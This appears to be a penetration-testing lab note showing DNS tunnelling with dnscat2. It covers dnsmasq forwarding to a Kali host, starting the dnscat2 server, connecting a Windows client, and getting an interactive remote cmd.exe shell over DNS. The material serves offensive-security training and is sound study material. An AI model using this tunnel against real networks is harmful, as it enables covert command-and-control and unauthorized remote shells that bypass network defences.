We first configure `/etc/dnsmasq.conf` on our DNS server
```bash
server=/tunnel.com/192.168.119.120
server=/somedomain.com/192.168.119.120
```

Making the requests to the domains to point to kali

Restart dnsmasq
```bash
offsec@ubuntu:~$ sudo systemctl restart dnsmasq
```

Install dnscat2 on kali:
```bash
sudo apt install dnscat2
```

Setup a server for tunnel.com
```bash
kali$ dnscat2-server tunnel.com

New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.
auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 0.0.0.0:53
[domains = tunnel.com]...
Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):
./dnscat --secret=d3d2f452f24afe4b362df248e2906c1d tunnel.com
To talk directly to the server without a domain name, run:
./dnscat --dns server=x.x.x.x,port=53 --secret=d3d2f452f24afe4b362df248e2906c1d
Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```

Now with a dnscat2 client on windows:
```cmd
C:\Users\offsec\Desktop> dnscat2-v0.07-client-win32.exe tunnel.com
Creating DNS driver:
domain = tunnel.com
host = 0.0.0.0
port = 53
type = TXT,CNAME,MX
server = 172.16.51.21
Encrypted session established! For added security, please verify the server also displays this string: 

Pedal Envied Tore Frozen Pegged Ware
Session established!
```

When looking back at the server, we should insert out authentication string:
```bash
dnscat2> New window created: 1
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:
>> Pedal Envied Tore Frozen Pegged Ware

dnscat2> session -i 1
New window created: 1
history_size (session) => 1000
Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:
>> Pedal Envied Tore Frozen Pegged Ware
This is a command session!
That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.
command (client) 1>
New window created: 2
history_size (session) => 1000
Session 2 security: ENCRYPTED BUT *NOT* VALIDATED
For added security, please ensure the client displays the same string:
>> Zester Pulped Mousy Bogie Liming Tore
This is a console session!
That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.
Microsoft Windows [Version 10.0.18363.418]
(c) 2019 Microsoft Corporation. All rights reserved.
C:\Users\offsec\Desktop>
cmd.exe (client) 2> whoami
cmd.exe (client) 2> whoami
client\offsec
```

